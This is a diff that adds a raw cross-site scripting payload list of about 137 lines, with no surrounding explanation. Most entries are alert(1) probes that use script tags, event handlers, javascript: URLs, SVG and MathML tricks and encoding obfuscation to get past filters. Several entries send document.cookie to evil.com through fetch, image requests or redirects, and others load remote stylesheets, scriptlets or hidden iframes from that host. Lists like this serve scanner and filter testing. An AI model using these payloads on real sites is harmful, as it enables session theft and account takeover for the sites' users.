@@ -1,0 +1,137 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
+<script>eval('alert(1)')</script>
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+<script>window.location='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
+<script>setTimeout('alert(1)',100)</script>
+<script>var a=1;alert(a)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input type="text" value="<script>alert(1)</script>">
+<textarea><script>alert(1)</script></textarea>
+<div onclick="alert(1)">Click me</div>
+<a href="javascript:alert(1)">Link</a>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<math><mtext><table><mglyph style=background-image:url(javascript:alert(1))>
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+javascript:alert(1)
+<a href="javascript:alert(document.domain)">test</a>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+<svg><animatetransform onbegin="alert(1)">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<select><option><img src=x onerror=alert(1)></option></select>
+<ruby><rt><img src=x onerror=alert(1)></rt></ruby>
+<listing><img src=x onerror=alert(1)></listing>
+<xmp><img src=x onerror=alert(1)></xmp>
+"onmouseover="alert(1)"//
+"><svg/onload=alert(1)>
+'onfocus='alert(1)' autofocus=
+"autofocus onfocus="alert(1)
+javascript:/*</title></style></textarea></script></xmp>--><svg/onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)<script>
+<svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+<svg><animatetransform onbegin="alert(1)">
+<svg><set onbegin="alert(1)" attributeName="x" to="0">
+<div style="background:url(javascript:alert(1))">
+<div style="width:expression(alert(1))">
+<style>body{background:url('javascript:alert(1)')}</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+<div style="background:url('https://evil.com/steal?c='+document.cookie)">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000034&#0000088&#0000083&#0000083&#0000034&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<STYLE>@import'http://evil.com/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://evil.com/xssmoz.xml#xss")}</STYLE>
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<IFRAME SRC=javascript:alert('XSS')>
+<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\\006A\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003A\\0061\\006C\\0065\\0072\\0074\\0028\\0027\\0058\\0053\\0053\\0027\\0029\\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.com/xss.xss">
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT>document.write('<SCRI' + 'PT>alert(1)</SC' + 'RIPT>')</SCRIPT>
+<SCRIPT>document.write(unescape('%3C%53%43%52%49%50%54%3E%61%6C%65%72%74%28%31%29%3C%2F%53%43%52%49%50%54%3E'))</SCRIPT>
+<SCRIPT>location.href='http://evil.com/steal.php?c='+document.cookie</SCRIPT>
+<SCRIPT>window.name='alert(1)'</SCRIPT>
+<IMG SRC="javascript:alert('XSS')" onerror>
+<IFRAME SRC="http://evil.com/xss.html" width=0 height=0>
+<SCRIPT>document.body.innerHTML='<img src=x onerror=alert(1)>'</SCRIPT>
+<SCRIPT>eval('alert(1)')</SCRIPT>
+<SCRIPT>alert(String.fromCharCode(65,76,69,82,84,40,49,41))</SCRIPT>
+<SCRIPT>window['al' + 'ert'](1)</SCRIPT>
+<SCRIPT>Function('alert(1)')()</SCRIPT>
+<SCRIPT>setTimeout('alert(1)')</SCRIPT>
+<SCRIPT>setInterval('alert(1)',1000)</SCRIPT>
+<A HREF="javascript:alert(1)">click</A>
+<IMG SRC=x onerror=eval("alert(1)")>
+<IMG SRC=x onerror=eval(atob('YWxlcnQoMSk='))>
+<IMG SRC=x onerror=location='javascript:alert(1)'>
+<IMG SRC=x onerror="with(document)body.innerHTML='<img src=x onerror=alert(1)>'">
+<IMG SRC=x onerror="try{alert(1)}catch(e){}">
+<IMG SRC=x onerror="alert(1)//<img src=x onerror=alert(2)>">
+<IMG SRC=x onerror=("alert",(1))>
+<IMG SRC=x onerror=(alert)(1)>
+<IMG SRC=x onerror="javascript:alert(1)">
+<IMG SRC=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<IMG SRC=x onerror="window['\u0061\u006c\u0065\u0072\u0074'](1)">
+<IMG SRC=x onerror="\x61\x6c\x65\x72\x74(1)">
+<img src=x onerror="function f(){alert(1)};f()">
+<img src=x onerror=(function(){alert(1)})()>
+<img src=x onerror=alert.call(this,1)>
+<img src=x onerror=alert.call(window,1)>
+<img src=x onerror="[].constructor.constructor('alert(1)')()">
+<img src=x onerror="[1].map(alert)">
+<img src=x one rror=alert(1)>
+<img src=x onerror=alert(1) foo=bar>
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)-->
+<img src=x onerror=alert(1)<!--
+<img src=x onerror=alert(1)>
+<body/onload=alert(1)>
+<body onload=alert(1)//
+<body onload=alert(1)-->
+<p onmouseover="alert(1)">hover</p>
+<svg onload="javascript:alert(1)">
+<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<svg><desc><img src=x onerror=alert(1)></desc></svg>
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+<svg><title><img src=x onerror=alert(1)></title></svg>
+<svg onload=alert(1)><animate attributeName=x dur=1s>
+<svg onload=alert(1)><set attributeName=x to=1>
+<svg onload=alert(1)><animateTransform attributeName=transform dur=1s>
+<svg><use href="data:image/svg+xml,&lt;script&gt;alert(1)&lt;/script&gt;">
+<svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+<svg><animatetransform onbegin="alert(1)" attributename="transform">
+<svg><discard onbegin="alert(1)">
+<svg><set onbegin="alert(1)" attributename="x" to="0">
